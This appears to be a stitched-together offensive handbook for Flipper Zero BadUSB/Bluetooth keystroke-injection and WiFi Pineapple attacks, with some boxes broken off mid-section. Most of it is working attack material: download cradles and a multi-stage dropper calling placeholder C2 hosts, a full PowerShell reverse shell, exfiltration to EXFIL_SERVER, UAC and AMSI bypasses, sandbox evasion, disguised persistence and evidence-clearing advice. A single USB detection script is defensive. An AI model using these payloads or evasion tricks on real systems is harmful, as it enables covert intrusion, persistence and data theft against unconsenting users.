# PAYLOAD OBFUSCATION AND EVASION

## Base64 Encoding

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ BASE64 ENCODING FOR STEALTH                                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHY USE BASE64?                                                              │
│ • Hides plaintext commands from casual observation                          │
│ • Bypasses some signature-based detection                                   │
│ • Commands look like random gibberish in logs                               │
│                                                                              │
│ POWERSHELL ENCODED COMMAND:                                                  │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ REM Encode (in PowerShell):                                       │      │
│ │ $cmd = 'Get-Process | Out-File C:\temp\procs.txt'                │      │
│ │ [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))│      │
│ │                                                                    │      │
│ │ REM Use in payload:                                               │      │
│ │ STRING powershell -enc RwBlAHQALQBQAHIAbwBjAGUAcwBzAC4ALgAuAA==  │      │
│ │ ENTER                                                              │      │
│ │                                                                    │      │
│ │ REM Logs show encoded gibberish, not actual command               │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ ⚠️ LIMITATION: Base64 is encoding, NOT encryption - easily decoded         │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## AMSI and Defender Bypass Concepts

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ WINDOWS SECURITY BYPASS (Educational Overview)                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ AMSI (Antimalware Scan Interface):                                          │
│ Scans PowerShell/VBScript in memory before execution.                       │
│ Even fileless payloads can be blocked!                                      │
│                                                                              │
│ BYPASS METHODS (Conceptual):                                                 │
│ • Patch AmsiScanBuffer to return "clean"                                    │
│ • Set amsiInitFailed flag to skip scanning                                  │
│ • Obfuscate to avoid signature detection                                    │
│                                                                              │
│ ⚠️ IMPORTANT:                                                                │
│ • Public bypasses are signatured - need obfuscation                        │
│ • Microsoft continuously patches known methods                              │
│ • Use only for authorized testing                                           │
│                                                                              │
│ UAC BYPASS METHODS:                                                          │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ REM Fodhelper method (Windows 10/11)                              │      │
│ │ STRINGLN reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe" /f │
│ │ STRINGLN reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f │
│ │ STRINGLN fodhelper.exe                                             │      │
│ │                                                                    │      │
│ │ REM Clean up registry after                                       │      │
│ │ STRINGLN reg delete "HKCU\Software\Classes\ms-settings" /f       │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## PowerShell Download Cradles

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DOWNLOAD CRADLES FOR PAYLOAD DELIVERY                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHAT IS A DOWNLOAD CRADLE?                                                   │
│ A one-liner that downloads and executes a script from a remote server       │
│ without saving to disk (fileless execution).                                │
│                                                                              │
│ COMMON CRADLES:                                                              │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ REM Method 1: WebClient (Classic)                                 │      │
│ │ IEX (New-Object Net.WebClient).DownloadString('http://URL/s.ps1')│      │
│ │                                                                    │      │
│ │ REM Method 2: Invoke-WebRequest (PowerShell 3.0+)                 │      │
│ │ IEX (iwr 'http://URL/s.ps1' -UseBasicParsing)                    │      │
│ │                                                                    │      │
│ │ REM Method 3: Invoke-RestMethod                                   │      │
│ │ IEX (irm http://URL/s.ps1)                                        │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ DUCKYSCRIPT INTEGRATION:                                                     │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ GUI r                                                              │      │
│ │ DELAY 500                                                          │      │
│ │ STRING powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')" │
│ │ ENTER                                                              │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
│ BENEFITS:                                                                    │
│ • Payload not stored on Flipper - update server-side anytime               │
│ • Fileless - harder to forensically recover                                 │
│ • Smaller DuckyScript payload                                               │
│                                                                              │
│ REQUIREMENTS:                                                                │
│ • Target needs internet access                                              │
│ • Your server must be accessible                                            │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

# TROUBLESHOOTING GUIDE

## Common Payload Failures

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ TROUBLESHOOTING BADUSB PAYLOADS                                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ PROBLEM: Characters missing or wrong                                        │
│ CAUSES:                                                                      │
│ • Keyboard layout mismatch → Use ALTSTRING or correct DUCKY_LANG           │
│ • Typing too fast → Add STRING_DELAY 50                                    │
│ • Caps Lock on → Add CAPSLOCK at start                                     │
│                                                                              │
│ PROBLEM: Run dialog doesn't open                                            │
│ CAUSES:                                                                      │
│ • Initial DELAY too short → Increase to DELAY 3000                         │
│ • Group Policy disabled Win+R → Use GUI then type "run"                   │
│ • Focus on fullscreen app → Add ESCAPE or GUI d first                     │
│                                                                              │
│ PROBLEM: Payload partially executes                                         │
│ CAUSES:                                                                      │
│ • App needs more load time → Increase DELAY after launch                   │
│ • Window lost focus → Popup stole focus, use ALT TAB                      │
│ • Screen saver activated → Keep payload under 5 minutes                   │
│                                                                              │
│ PROBLEM: USB not recognized                                                  │
│ CAUSES:                                                                      │
│ • USB ports disabled by policy → Try different ports                       │
│ • Device vendor blocked → Use ID command to spoof                         │
│ • Firmware issue → Update and reload payload                               │
│                                                                              │
│ PROBLEM: Script blocked by security                                         │
│ CAUSES:                                                                      │
│ • Execution Policy → Add -ep bypass                                        │
│ • AMSI detection → Obfuscate commands                                      │
│ • Antivirus → Use Base64 encoding, avoid known strings                    │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

# MULTI-STAGE PAYLOADS

## Understanding Multi-Stage Attacks

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ MULTI-STAGE PAYLOAD ARCHITECTURE                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHY USE MULTI-STAGE PAYLOADS?                                                │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ 1. Bypass size limitations (DuckyScript has character limits)      │     │
│ │ 2. Evade detection (smaller initial footprint)                     │     │
│ │ 3. Conditional execution based on target environment               │     │
│ │ 4. Error recovery (each stage can verify previous success)         │     │
│ │ 5. Modular design (swap stages for different objectives)           │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ STAGE BREAKDOWN:                                                             │
│                                                                              │
│   Stage 0          Stage 1           Stage 2          Stage 3               │
│   (Dropper)        (Loader)          (Payload)        (Cleanup)             │
│       │                │                 │                │                 │
│       ▼                ▼                 ▼                ▼                 │
│  ┌─────────┐     ┌───────────┐     ┌──────────┐    ┌──────────┐            │
│  │ BadUSB  │ ──► │ Download  │ ──► │ Execute  │ ──►│ Remove   │            │
│  │ Script  │     │ Next Stage│     │ Main Code│    │ Traces   │            │
│  └─────────┘     └───────────┘     └──────────┘    └──────────┘            │
│       │                │                 │                │                 │
│       ▼                ▼                 ▼                ▼                 │
│  • Small size      • Fetch from     • Actual        • Delete temp          │
│  • Fast exec         web/file         attack          files                │
│  • Opens door      • Decode if      • Full          • Clear logs           │
│    for loader        encrypted        capability    • Self-destruct        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Stage 1: The Loader

```

│ STAGE 1 - LOADER SCRIPTS (Hosted on C2)                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │

│ ┌─────────────────────────────────────────────────────────────────────┐     │

│ │ # Checks if target is suitable before full payload                 │     │

│ │ # Check for VM indicators                                         │     │

│ │ $system = (Get-WmiObject Win32_ComputerSystem).Model              │     │
│ │ if($vm | Where-Object {$system -like "*$_*"}){                    │     │
│ │     # In VM - abort or run decoy                                  │     │
│ │     exit                                                          │     │
│ │ }                                                                  │     │
│ │                                                                    │     │
│ │ # Check for analysis tools                                        │     │
│ │ $tools = @('wireshark','procmon','procexp','ida','x64dbg')       │     │
│ │ $running = Get-Process | Select-Object -Expand Name               │     │
│ │ if($tools | Where-Object {$running -contains $_}){                │     │
│ │     exit  # Analysis tools detected                               │     │
│ │ }                                                                  │     │
│ │                                                                    │     │
│ │ # Environment clear - proceed to Stage 2                          │     │
│ │ IEX(IWR 'http://C2/stage2.ps1' -UseBasicParsing)                 │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │

│ │ # Stage 1: Establish Persistence Before Main Payload               │     │
│ │                                                                    │     │
│ │ # Create scheduled task for re-execution                          │     │
│ │ $action = New-ScheduledTaskAction -Execute 'powershell.exe' `     │     │
│ │     -Argument "-w hidden -ep bypass -c `"IEX(IWR 'http://C2/s2')`"│     │
│ │ $trigger = New-ScheduledTaskTrigger -AtLogOn                      │     │
│ │ Register-ScheduledTask -TaskName 'WindowsUpdate' `                │     │
│ │     -Action $action -Trigger $trigger -RunLevel Limited           │     │
│ │                                                                    │     │
│ │ # Also run immediately                                             │     │
│ │ IEX(IWR 'http://C2/stage2.ps1')                                   │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Complete Multi-Stage DuckyScript Example

```
REM =============================================
REM PAYLOAD: Multi-Stage Attack Framework
REM STAGES: Dropper → Loader → Payload → Cleanup
REM =============================================

REM WHAT THIS DOES:
REM Stage 0 (This script): Opens PowerShell, downloads Stage 1
REM Stage 1 (Web): Checks environment, establishes persistence
REM Stage 2 (Web): Executes main payload (recon/shell/etc)
REM Stage 3 (Web): Cleans up evidence

REM ============ STAGE 0: DROPPER ============

REM Spoof as legitimate device
ID 046D:C534 Logitech USB Receiver

REM Wait for USB enumeration
DELAY 2000

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM Download and execute Stage 1 (Loader)
REM The loader will handle everything from here
STRING $ErrorActionPreference='SilentlyContinue'
ENTER
DELAY 200

REM Using multiple download methods for reliability
STRING try{IEX(IWR 'http://C2/stage1.ps1' -UseBasicParsing)}catch{try{IEX((New-Object Net.WebClient).DownloadString('http://C2/stage1.ps1'))}catch{}}
ENTER

REM ============ END OF DUCKYSCRIPT ============
REM Remaining stages are PowerShell scripts hosted on C2
```

```
ENTER

ENTER
STRING IWR -Uri "http://EXFIL_SERVER/collect" -Method POST -Body @{data=$encoded} -UseBasicParsing
ENTER

REM Cleanup
STRING Remove-Item $out -Force
ENTER
STRING exit
ENTER
```

## Enterprise Defense Detection Script

```powershell
# =============================================
# SCRIPT: Enterprise BadUSB Detection
# PURPOSE: Detect BadUSB attacks in enterprise
# DEPLOY: Via GPO or SCCM to endpoints
# =============================================

# Configure logging
$LogFile = "C:\Windows\Logs\USBSecurity.log"

function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $LogFile -Append
}

# Monitor for new USB HID devices
$query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PnPEntity'"
$filter = @{
    Query = $query
    SourceIdentifier = "USB_Monitor"
}

Register-WmiEvent @filter -Action {
    $device = $event.SourceEventArgs.NewEvent.TargetInstance

    # Check if it's a HID device
    if ($device.PNPDeviceID -like "*HID*" -or $device.Description -like "*Keyboard*") {

        Write-Log "NEW HID DEVICE: $($device.Description)"
        Write-Log "VID/PID: $($device.PNPDeviceID)"

        # Check for suspicious VID/PID combinations
        $suspiciousVIDs = @(
            "VID_1B4F",  # Spark Fun (Arduino)
            "VID_2341",  # Arduino
            "VID_16C0",  # Teensy
            "VID_0483"   # STMicroelectronics (Flipper)
        )

        foreach ($vid in $suspiciousVIDs) {
            if ($device.PNPDeviceID -like "*$vid*") {
                Write-Log "ALERT: Suspicious USB device detected!"

                # Send to SIEM
                $alertData = @{
                    EventType = "Suspicious_USB_Device"
                    Device = $device.Description
                    DeviceID = $device.PNPDeviceID
                    Computer = $env:COMPUTERNAME
                    User = $env:USERNAME
                    Timestamp = (Get-Date -Format "o")
                }

                # Send to SIEM endpoint (example)
                try {
                    Invoke-RestMethod -Uri "https://siem.company.com/api/alerts" `
                        -Method POST `
                        -Body ($alertData | ConvertTo-Json) `
                        -ContentType "application/json"
                } catch {
                    Write-Log "Failed to send SIEM alert: $_"
                }

                # Optional: Block the device
                # Disable-PnpDevice -InstanceId $device.PNPDeviceID -Confirm:$false
            }
        }
    }
}

Write-Log "USB Security Monitor started"
Write-Host "Monitoring for USB devices... Press Ctrl+C to stop."

# Keep the script running
while ($true) { Start-Sleep -Seconds 60 }
```

```
│ □ Test with Windows Defender ENABLED (realistic scenario)                   │
│ □ Test with Windows Defender DISABLED (baseline timing)                     │
│ □ Test on locked screen (payload should fail gracefully)                    │
│ □ Test during Windows Update (system busy)                                  │
│ □ Test with slow USB enumeration (some systems are slow)                    │
│ □ Test with different keyboard layouts (US, UK, German, etc.)               │
│ □ Test payload visibility (can user see commands?)                          │
│ □ Test UAC prompt handling                                                  │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Operational Security (OPSEC)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ OPERATIONAL SECURITY (OPSEC) FOR AUTHORIZED TESTING                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ PURPOSE: Maintain stealth during authorized testing to provide              │
│ realistic assessment of detection capabilities                               │
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ DEVICE OPSEC                                                                 │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ FLIPPER ZERO:                                                                │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ DO:                                                                │     │
│ │ ✓ Use legitimate-looking VID/PID (Logitech, Microsoft, Dell)     │     │
│ │ ✓ Test payloads extensively before deployment                     │     │
│ │ ✓ Minimize execution time (faster = less visible)                 │     │
│ │ ✓ Use hidden window flags (-w hidden)                            │     │
│ │ ✓ Clear evidence after successful execution                      │     │
│ │                                                                     │     │
│ │ DON'T:                                                             │     │
│ │ ✗ Use default Flipper VID/PID (easily detected)                  │     │
│ │ ✗ Leave long-running visible windows                             │     │
│ │ ✗ Use excessively loud/fast keystroke injection                  │     │
│ │ ✗ Connect to obvious C2 domains (use domain fronting)            │     │
│ │ ✗ Leave identifiable artifacts                                    │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ WIFI PINEAPPLE PAGER:                                                        │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ DO:                                                                │     │
│ │ ✓ Clone exact SSID of target network                             │     │
│ │ ✓ Match BSSID format if possible                                  │     │
│ │ ✓ Use realistic captive portal (match corporate branding)        │     │
│ │ ✓ Position for optimal signal vs. concealment                    │     │
│ │ ✓ Have retrieval plan before deployment                          │     │
│ │                                                                     │     │
│ │ DON'T:                                                             │     │
│ │ ✗ Use obviously fake SSIDs                                        │     │
│ │ ✗ Leave device visible or easily discoverable                    │     │
│ │ ✗ Broadcast at maximum power (attracts attention)                │     │
│ │ ✗ Forget to retrieve device                                       │     │
│ │ ✗ Leave logs on device after engagement                          │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ NETWORK OPSEC                                                                │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ C2 COMMUNICATION:                                                            │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │ RECOMMENDED SETUP:                                                 │     │
│ │                                                                     │     │

│ │                                                                     │     │

│ │ • Domain fronting through CDN (Cloudflare, Azure, AWS)           │     │
```

## Common Deployment Failures

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ COMMON DEPLOYMENT FAILURES & TROUBLESHOOTING                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ FLIPPER ZERO FAILURES                                                        │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ PROBLEM: Payload doesn't execute                                             │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │ SYMPTOMS:                                                          │     │
│ │ • Flipper shows "running" but nothing happens on target           │     │
│ │ • No windows open, no keystrokes visible                          │     │
│ │                                                                     │     │
│ │ CAUSES & SOLUTIONS:                                                │     │
│ │                                                                     │     │
│ │ 1. Screen is locked                                               │     │
│ │    → Payload needs unlocked screen to work                        │     │
│ │    → Solution: Wait for user to unlock or use different vector   │     │
│ │                                                                     │     │
│ │ 2. UAC prompt blocking execution                                  │     │
│ │    → Payload requires admin but user is standard                  │     │
│ │    → Solution: Use non-admin payload or add UAC bypass           │     │
│ │                                                                     │     │
│ │ 3. USB port not enabled                                           │     │
│ │    → Some organizations disable USB HID                           │     │
│ │    → Solution: Try different port, check if USB is blocked       │     │
│ │                                                                     │     │
│ │ 4. Wrong keyboard layout                                          │     │
│ │    → Payload uses US layout but target uses UK/German             │     │
│ │    → Solution: Detect layout first or use ALTSTRING               │     │
│ │                                                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ PROBLEM: Commands appear garbled or wrong characters                         │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │ CAUSE: Keyboard layout mismatch                                   │     │
│ │                                                                     │     │
│ │ US Keyboard:  @ # $ % ^ & * ( )                                   │     │
│ │ UK Keyboard:  " £ $ % ^ & * ( )  ← Different!                     │     │
│ │ DE Keyboard:  " § $ % & / ( ) =  ← Very different!                │     │
│ │                                                                     │     │
│ │ SOLUTIONS:                                                         │     │
│ │ 1. Pre-determine target layout during recon                       │     │
│ │ 2. Use ALTSTRING (Flipper) for special characters                │     │
│ │ 3. Avoid special characters where possible                        │     │
│ │ 4. Base64 encode and use only alphanumeric                       │     │
│ │                                                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ PROBLEM: Payload detected by antivirus                                       │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │ SYMPTOMS:                                                          │     │
│ │ • Windows Defender popup appears                                  │     │
│ │ • PowerShell window closes immediately                            │     │
│ │ • No callback received                                            │     │
│ │                                                                     │     │
│ │ SOLUTIONS:                                                         │     │
│ │ 1. Obfuscate PowerShell commands                                  │     │
│ │    → String concatenation: "pow" + "er" + "shell"                │     │
│ │    → Variable substitution                                        │     │
│ │    → Base64 encoding                                              │     │
│ │                                                                     │     │
│ │ 2. Use alternative execution methods                              │     │
│ │    → mshta.exe                                                    │     │
│ │    → certutil.exe                                                 │     │
│ │    → bitsadmin.exe                                                │     │
│ │                                                                     │     │
│ │ 3. Reduce payload signature                                       │     │
│ │    → Avoid common patterns like "IEX(IWR...)"                    │     │
│ │    → Break into multiple stages                                   │     │
│ │                                                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ PROBLEM: Timing issues - commands not completing                             │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │ SYMPTOMS:                                                          │     │
│ │ • Partial commands visible                                        │     │
│ │ • Run dialog opens but command incomplete                         │     │
│ │ • PowerShell opens but doesn't execute                           │     │
│ │                                                                     │     │
│ │ CAUSES:                                                            │     │
│ │ • Slow computer (older hardware, busy system)                    │     │
│ │ • Insufficient delays between commands                            │     │
│ │ • USB enumeration taking longer than expected                     │     │
│ │                                                                     │     │
│ │ SOLUTIONS:                                                         │     │
│ │ 1. Increase DELAY values                                          │     │
│ │    → USB init: 2000 → 3000ms                                      │     │
│ │    → After GUI r: 500 → 800ms                                     │     │
│ │    → After ENTER: 500 → 1000ms                                    │     │
│ │                                                                     │     │
│ │ 2. Use DEFAULTDELAY for consistent timing                         │     │
│ │    → DEFAULTDELAY 100 (adds 100ms between each line)             │     │
│ │                                                                     │     │
│ │ 3. Add verification delays                                         │     │
│ │    → Wait for window to actually open before typing              │     │
│ │                                                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ WIFI PINEAPPLE PAGER FAILURES                                                │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ PROBLEM: No clients connecting to rogue AP                                   │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │ POSSIBLE CAUSES:                                                   │     │
│ │                                                                     │     │
│ │ 1. Legitimate AP has stronger signal                              │     │
│ │    → Move Pager closer to targets                                 │     │
│ │    → Use external antenna for more power                          │     │
│ │    → Position between targets and legitimate AP                   │     │
│ │                                                                     │     │
│ │ 2. SSID doesn't match exactly                                     │     │
│ │    → Check for typos                                              │     │
│ │    → Match capitalization exactly                                 │     │
│ │    → Watch for hidden characters                                  │     │
│ │                                                                     │     │
│ │ 3. Clients already connected to legitimate network                │     │
│ │    → Use deauth to force reconnection                            │     │
│ │    → Wait for natural disconnection (client moves)               │     │
│ │                                                                     │     │
│ │ 4. Certificate mismatch (WPA-Enterprise)                          │     │
│ │    → Some clients verify certificates                             │     │
│ │    → May need custom certificate setup                           │     │
│ │                                                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ PROBLEM: Captive portal not appearing                                        │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │ CAUSES & SOLUTIONS:                                                │     │
│ │                                                                     │     │
│ │ 1. Portal service not running                                     │     │
│ │    → Check: portalctl status                                      │     │
│ │    → Fix: portalctl start                                         │     │
│ │                                                                     │     │
│ │ 2. DNS/DHCP misconfiguration                                      │     │
│ │    → Verify DHCP is assigning addresses                          │     │
│ │    → Verify DNS redirects to portal                               │     │
│ │                                                                     │     │
│ │ 3. Client using cellular instead of WiFi                          │     │
│ │    → Some phones prefer cellular for connectivity tests           │     │
│ │    → Verify client is actually using WiFi                        │     │
│ │                                                                     │     │
│ │ 4. HTTPS sites not redirecting                                    │     │
│ │    → Modern browsers prefer HTTPS                                 │     │
│ │    → Captive portal detection may fail                           │     │
│ │    → Solution: Rely on OS captive portal detection               │     │
│ │                                                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ PROBLEM: Battery dying during engagement                                     │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │ PREVENTION:                                                        │     │
│ │ • Always bring power bank (20,000+ mAh)                          │     │
│ │ • Check battery before deployment                                 │     │
│ │ • Position near power outlet if possible                         │     │
│ │ • Reduce transmit power if range allows                          │     │
│ │ • Disable unused features (Bluetooth, etc.)                      │     │
│ │                                                                     │     │
│ │ RECOVERY:                                                          │     │
│ │ • Retrieve device immediately                                     │     │
│ │ • Check logs for any captured data                               │     │
│ │ • Recharge and redeploy if time allows                           │     │
│ │                                                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ ═══════════════════════════════════════════════════════════════════════════ │
│ RECOVERY PROCEDURES                                                          │
│ ═══════════════════════════════════════════════════════════════════════════ │
│                                                                              │
│ IF PAYLOAD FAILS:                                                            │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │ 1. Remove device immediately                                      │     │
│ │ 2. Move to safe location                                          │     │
│ │ 3. Diagnose issue (check Flipper screen for errors)              │     │
│ │ 4. Adjust payload or try backup payload                          │     │
```

# BLUETOOTH BADKB (WIRELESS BADUSB)

## Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ BLUETOOTH BADKB - WIRELESS KEYSTROKE INJECTION                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHAT IS BADKB?                                                               │
│ BadKB is wireless BadUSB - keystroke injection over Bluetooth instead       │
│ of USB. The Flipper Zero can pair with a target device as a Bluetooth       │
│ keyboard and inject keystrokes without any physical USB connection.         │
│                                                                              │
│ COMPARISON:                                                                  │
│ ┌─────────────────────────────────────────────────────────────────────┐     │
│ │                                                                     │     │
│ │  BADUSB (Wired)                    BADKB (Wireless)                │     │
│ │  ──────────────                    ───────────────                 │     │
│ │                                                                     │     │
│ │  [Flipper]──USB──►[Target]        [Flipper]~~~BT~~~►[Target]      │     │
│ │                                                                     │     │
│ │  • Requires physical plug-in      • No physical connection needed  │     │
│ │  • Instant execution              • Requires pairing first         │     │
│ │  • Works on any USB host          • Target must have Bluetooth     │     │
│ │  • Very fast keystroke rate       • Slightly slower keystrokes     │     │
│ │  • Visible to user (plugged in)   • Can attack from concealment   │     │
│ │  • Works on locked screens (no)   • Works on locked screens (no)  │     │
│ │                                                                     │     │
│ └─────────────────────────────────────────────────────────────────────┘     │
│                                                                              │
│ USE CASES:                                                                   │
│ • Target device in another room (within Bluetooth range ~10m)               │
│ • Attacking without approaching the target physically                       │
│ • Devices with no accessible USB ports                                      │
│ • Maintaining persistent access after initial pairing                       │
│ • Mobile devices (phones, tablets) that accept BT keyboards                 │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

```
│ │ DELAY 500                    DELAY 1000                           │      │

│ │ ENTER                        ENTER                                │      │
│ │ DELAY 500                    DELAY 1000                           │      │
│ │                                                                    │      │

│                                                                              │
```

```
│                                                                              │
│ WHAT IS A REVERSE SHELL?                                                     │

│                                                                              │
│ ┌────────────────────────────────────────────────────────────────────┐      │

│ │  [Attacker] ────connects to────► [Target]                         │      │
│ │  (Blocked by firewall - incoming connections usually blocked)     │      │
│ │                                                                    │      │
│ │  REVERSE CONNECTION:                                               │      │
│ │  [Attacker] ◄────connects from──── [Target]                       │      │
│ │  (Works! Outgoing connections usually allowed)                     │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │

│ • Reverse shell provides persistent remote access                           │
│ • Continue attacking after the USB device is removed                        │
│ • Full interactive command-line access                                      │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

```

├─────────────────────────────────────────────────────────────────────────────┤

│ BASIC TCP REVERSE SHELL:                                                     │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │ REM Attacker: Start listener first                                │      │
│ │ REM   nc -lvnp 4444                                               │      │
│ │                                                                    │      │
│ │ REM On target via DuckyScript:                                    │      │
│ │ DELAY 2000                                                         │      │
│ │ GUI r                                                              │      │
│ │ DELAY 500                                                          │      │

│ │ ENTER                                                              │      │
│ │ DELAY 1500                                                         │      │
│ │                                                                    │      │
│ │ REM PowerShell reverse shell one-liner                            │      │
│ │ STRING $c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);   │      │
│ │ STRING $s=$c.GetStream();[byte[]]$b=0..65535|%{0};                │      │
│ │ STRING while(($i=$s.Read($b,0,$b.Length)) -ne 0){                 │      │
│ │ STRING $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);     │      │
│ │ STRING $r=(iex $d 2>&1|Out-String);                               │      │
│ │ STRING $r2=$r+'PS '+(pwd).Path+'> ';                              │      │
│ │ STRING $sb=([text.encoding]::ASCII).GetBytes($r2);                │      │
│ │ STRING $s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()          │      │
│ │ ENTER                                                              │      │
│ │                                                                    │      │
│ │ REM Replace ATTACKER_IP with your listener IP                    │      │
│ │ REM Replace 4444 with your listener port                          │      │

│ │ GUI r                                                              │      │
│ │ DELAY 500                                                          │      │

│ │ ENTER                                                              │      │
│ │                                                                    │      │
│ │ REM Full Base64 string would be very long                        │      │

│ │                                                                    │      │

│ │ DELAY 500                                                          │      │

│ │ ENTER                                                              │      │

│ │ REM shell.ps1 on your server contains the full reverse shell     │      │
```

# DLL HIJACKING - COMPREHENSIVE GUIDE

## Understanding DLL Hijacking

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ DLL HIJACKING FUNDAMENTALS                                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│ WHAT IS A DLL?                                                               │
│ Dynamic Link Library (DLL) - A file containing code and data that can be   │
│ used by multiple programs simultaneously. Windows applications load DLLs    │
│ to gain functionality without including the code in the main executable.    │
│                                                                              │
│ WHAT IS DLL HIJACKING?                                                       │
│ Exploiting the way Windows searches for DLLs to load a malicious DLL       │
│ instead of the legitimate one. When an application loads a DLL, Windows    │
│ searches in a specific order - an attacker places a malicious DLL in a     │
│ location that's searched BEFORE the legitimate location.                    │
│                                                                              │
│ ┌────────────────────────────────────────────────────────────────────┐      │
│ │                                                                    │      │
│ │  NORMAL DLL LOADING:                                              │      │
│ │  ─────────────────                                                │      │
│ │  [Application.exe] → "I need helper.dll"                         │      │
│ │         │                                                         │      │
│ │         ▼                                                         │      │
│ │  [Windows Loader] → Search order:                                │      │
│ │         │            1. Application directory                     │      │
│ │         │            2. System32                                  │      │
│ │         │            3. System directory                          │      │
│ │         │            4. Windows directory                         │      │
│ │         │            5. Current directory                         │      │
│ │         │            6. PATH directories                          │      │
│ │         │                                                         │      │
│ │         └──► Finds legitimate helper.dll in System32             │      │
│ │              Application works normally                          │      │
│ │                                                                    │      │
│ │  DLL HIJACKING ATTACK:                                            │      │
│ │  ────────────────────                                             │      │
│ │  [Application.exe] → "I need helper.dll"                         │      │
│ │         │                                                         │      │
│ │         ▼                                                         │      │
│ │  [Windows Loader] → Search order:                                │      │
│ │         │            1. Application directory ← MALICIOUS.dll!   │      │
│ │         │               ↑ Attacker placed it here                │      │
│ │         │                                                         │      │
│ │         └──► Loads ATTACKER'S DLL first                         │      │
│ │              Attacker's code executes with app's privileges      │      │
│ │                                                                    │      │
│ └────────────────────────────────────────────────────────────────────┘      │
│                                                                              │
